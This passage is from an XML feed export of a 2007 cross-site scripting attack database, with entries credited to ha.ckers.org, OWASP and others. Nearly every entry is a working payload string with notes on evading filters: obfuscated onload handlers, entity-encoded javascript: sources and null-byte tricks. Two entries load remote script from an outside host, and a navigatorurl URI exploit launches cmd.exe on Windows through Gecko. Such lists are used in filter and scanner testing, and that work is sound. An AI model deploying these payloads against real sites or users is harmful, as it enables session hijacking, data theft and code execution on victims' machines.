navigatorurl-uri executes the cmd.exe on vulnerable systems.</ddb:exploitDescription>      <ddb:exploitName>navigatorurl: code execution</ddb:exploitName>      <ddb:exploitString>navigatorurl:test&quot; -chrome &quot;javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)</ddb:exploitString>      <ddb:exploitTags>URI exploits, gecko, injection, general</ddb:exploitTags>    </item>    <item>      <title>No Closing Script Tag</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1947</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;No Closing Script Tag&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”&gt;&lt;/SCRIPT&gt;” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, injection, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:27:38 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”&gt;&lt;/SCRIPT&gt;” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.</ddb:exploitDescription>      <ddb:exploitName>No Closing Script Tag</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js</ddb:exploitString>      <ddb:exploitTags>general, evil tags, injection, gecko</ddb:exploitTags>    </item>    <item>      <title>No Quotes/Semicolons</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1953</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;No Quotes/Semicolons&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;No single quotes or double quotes or semicolons.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:14:54 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>No single quotes or double quotes or semicolons.</ddb:exploitDescription>      <ddb:exploitName>No Quotes/Semicolons</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Non-Alpha/Non-Digit</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1945</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Non-Alpha/Non-Digit&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”&lt;SCRIPT\s” != ”&lt;SCRIPT/XSS\s”&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:27:09 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”&lt;SCRIPT\s” != ”&lt;SCRIPT/XSS\s”</ddb:exploitDescription>      <ddb:exploitName>Non-Alpha/Non-Digit</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, injection</ddb:exploitTags>    </item>    <item>      <title>Non-Alpha/Non-Digit Part 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1946</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Non-Alpha/Non-Digit Part 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BODY onload!#$%&amp;()*~+-_.###:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:27:20 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.</ddb:exploitDescription>      <ddb:exploitName>Non-Alpha/Non-Digit Part 2</ddb:exploitName>      <ddb:exploitString>&lt;BODY onload!#$%&amp;()*~+-_.###:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Noscript-breaker with mouseover</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1820</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Noscript-breaker with mouseover&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;/noscript&gt;&lt;br&gt;&lt;code onmouseover=a=eval;b=alert;a(b(/h/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks noscript areas and appends an element reacting on mouseover events.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, obfuscated, user interaction&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks noscript areas and appends an element reacting on mouseover events.</ddb:exploitDescription>      <ddb:exploitName>Noscript-breaker with mouseover</ddb:exploitName>      <ddb:exploitString>&lt;/noscript&gt;&lt;br&gt;&lt;code onmouseover=a=eval;b=alert;a(b(/h/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, obfuscated, user interaction</ddb:exploitTags>    </item>    <item>      <title>Null Chars 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1942</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Null Chars 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;perl -e 'print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;'&gt; out&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer, CRLF&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Mon, 13 Aug 07 10:39:02 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.</ddb:exploitDescription>      <ddb:exploitName>Null Chars 1</ddb:exploitName>      <ddb:exploitString>perl -e 'print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;'&gt; out</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer, CRLF</ddb:exploitTags>    </item>    <item>      <title>Null Chars 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1943</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Null Chars 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;perl -e 'print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;' &gt; out&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, CRLF&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Mon, 13 Aug 07 10:39:11 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date</ddb:exploitDescription>      <ddb:exploitName>Null Chars 2</ddb:exploitName>      <ddb:exploitString>perl -e 'print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;' &gt; out</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, CRLF</ddb:exploitTags>    </item>    <item>      <title>Obfuscated body onload vector</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2040</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated body onload vector&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body onload=;;;;;;;;;;;_=alert;_(1);;;;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:31:23 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated body onload vector</ddb:exploitName>      <ddb:exploitString>&lt;body onload=;;;;;;;;;;;_=alert;_(1);;;;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Obfuscated DOM element creation</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3930</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated DOM element creation&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=&lt;br&gt;0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=&lt;br&gt;0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa&lt;br&gt;rentNode;x.appendChild(i);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes ternary operators to obfuscate JavaScript code which creates new DOM elements.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Tue, 04 Sep 07 08:13:45 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes ternary operators to obfuscate JavaScript code which creates new DOM elements.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated DOM element creation</ddb:exploitName>      <ddb:exploitString>s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=&#13;&#10;0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=&#13;&#10;0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa&#13;&#10;rentNode;x.appendChild(i);</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Obfuscated double-body onload vector</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2044</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated double-body onload vector&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body &lt;body onload=;;;;;al:eval('al'+'ert(1)');;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:38:12 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated double-body onload vector</ddb:exploitName>      <ddb:exploitString>&lt;body &lt;body onload=;;;;;al:eval('al'+'ert(1)');;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Obfuscated image tag using dec entities</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2027</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated image tag using dec entities&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;&lt;WBR&gt;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;&lt;WBR&gt;#116;&amp;#58;&amp;#97;&lt;br&gt; &amp;#108;&amp;#101;&amp;&lt;WBR&gt;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83&lt;WBR&gt;;&amp;#83;&amp;#39;&amp;#41&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This attack is built together with obfuscated decimal entities and create a JS image source.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, obfuscated, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:16:26 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This attack is built together with obfuscated decimal entities and create a JS image source.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated image tag using dec entities</ddb:exploitName>      <ddb:exploitString>&lt;IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;&lt;WBR&gt;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;&lt;WBR&gt;#116;&amp;#58;&amp;#97;&#13;&#10; &amp;#108;&amp;#101;&amp;&lt;WBR&gt;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83&lt;WBR&gt;;&amp;#83;&amp;#39;&amp;#41&gt;</ddb:exploitString>      <ddb:exploitTags>general, basic, obfuscated, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Obfuscated image tag using hex entities</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2032</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated image tag using hex entities&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMGSRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;&lt;WBR&gt;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;&lt;WBR&gt;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&lt;br&gt; &amp;&lt;WBR&gt;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This attack is built together with obfuscated hexadecimal entities and create a JS image source.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, obfuscated, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:21:46 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This attack is built together with obfuscated hexadecimal entities and create a JS image source.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated image tag using hex entities</ddb:exploitName>      <ddb:exploitString>&lt;IMGSRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;&lt;WBR&gt;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;&lt;WBR&gt;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&#13;&#10; &amp;&lt;WBR&gt;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</ddb:exploitString>      <ddb:exploitTags>general, basic, obfuscated, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Obfuscated image tag using long dec entities</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2030</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated image tag using long dec entities&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMGSRC=&amp;#0000106&amp;#0000097&amp;&lt;WBR&gt;#0000118&amp;#0000097&amp;#0000115&amp;&lt;WBR&gt;#0000099&amp;#0000114&amp;#0000105&amp;&lt;WBR&gt;#0000112&amp;#0000116&amp;#0000058&lt;br&gt;&amp;&lt;WBR&gt;#0000097&amp;#0000108&amp;#0000101&amp;&lt;WBR&gt;#0000114&amp;#0000116&amp;#0000040&amp;&lt;WBR&gt;#0000039&amp;#0000088&amp;#0000083&amp;&lt;WBR&gt;#0000083&amp;#0000039&amp;#0000041&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This attack is built together with obfuscated long decimal entities and create a JS image source.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, owasp, obfuscated, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:16:23 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This attack is built together with obfuscated long decimal entities and create a JS image source.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated image tag using long dec entities</ddb:exploitName>      <ddb:exploitString>&lt;IMGSRC=&amp;#0000106&amp;#0000097&amp;&lt;WBR&gt;#0000118&amp;#0000097&amp;#0000115&amp;&lt;WBR&gt;#0000099&amp;#0000114&amp;#0000105&amp;&lt;WBR&gt;#0000112&amp;#0000116&amp;#0000058&#13;&#10;&amp;&lt;WBR&gt;#0000097&amp;#0000108&amp;#0000101&amp;&lt;WBR&gt;#0000114&amp;#0000116&amp;#0000040&amp;&lt;WBR&gt;#0000039&amp;#0000088&amp;#0000083&amp;&lt;WBR&gt;#0000083&amp;#0000039&amp;#0000041&gt;</ddb:exploitString>      <ddb:exploitTags>general, owasp, obfuscated, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Obfuscated JS image source</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2023</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated JS image source&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&gt;&quot;'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;&lt;br&gt; alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses urlencoded hex entities to obfuscate the javascript: image source.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, owasp, obfuscated, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:11:05 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses urlencoded hex entities to obfuscate the javascript: image source.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated JS image source</ddb:exploitName>      <ddb:exploitString>&gt;&quot;'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;&#13;&#10; alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;</ddb:exploitString>      <ddb:exploitTags>general, owasp, obfuscated, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Obfuscated name trigger for Firefox</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3230</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated name trigger for Firefox&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;(1?(1?{a:1?&quot;&quot;[1?&quot;ev\a\l&quot;:0](1?&quot;\a\lert&quot;:0):0}:0).a:0)[1?&quot;\c\a\l\l&quot;:0](content,1?&quot;x\s\s&quot;:0)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This XSS vector uses a parser bug in Firefox to obfuscate the methods needed to trigger the name contained payload. &lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, gecko, obfuscated, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;SIrDarckCat</description>      <pubDate>Sun, 26 Aug 07 16:45:47 -0400</pubDate>      <ddb:authorName>SIrDarckCat</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This XSS vector uses a parser bug in Firefox to obfuscate the methods needed to trigger the name contained payload. </ddb:exploitDescription>      <ddb:exploitName>Obfuscated name trigger for Firefox</ddb:exploitName>      <ddb:exploitString>(1?(1?{a:1?&quot;&quot;[1?&quot;ev\a\l&quot;:0](1?&quot;\a\lert&quot;:0):0}:0).a:0)[1?&quot;\c\a\l\l&quot;:0](content,1?&quot;x\s\s&quot;:0)</ddb:exploitString>      <ddb:exploitTags>general, gecko, obfuscated, self contained</ddb:exploitTags>    </item>    <item>      <title>Obfuscated onload attribute variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2652</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated onload attribute variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body/s/onload=x={doc:parent.document};x.doc.writeln(1)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, evil tags, JSON&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Tue, 14 Aug 07 05:57:02 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated onload attribute variant 1</ddb:exploitName>      <ddb:exploitString>&lt;body/s/onload=x={doc:parent.document};x.doc.writeln(1)</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, evil tags, JSON</ddb:exploitTags>    </item>    <item>      <title>Obfuscated onload attribute variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2651</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated onload attribute variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, evil tags, JSON&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Tue, 14 Aug 07 05:55:48 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated onload attribute variant 2</ddb:exploitName>      <ddb:exploitString>&lt;body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, evil tags, JSON</ddb:exploitTags>    </item>    <item>      <title>Obfuscated XML predicate vector variation 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7097</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated XML predicate vector variation 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;123[''+&lt;_&gt;ev&lt;/_&gt;+&lt;_&gt;al&lt;/_&gt;](''+&lt;_&gt;aler&lt;/_&gt;+&lt;_&gt;t&lt;/_&gt;+&lt;_&gt;(1)&lt;/_&gt;);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, xml predicates, obfuscated, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:41:44 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated XML predicate vector variation 1</ddb:exploitName>      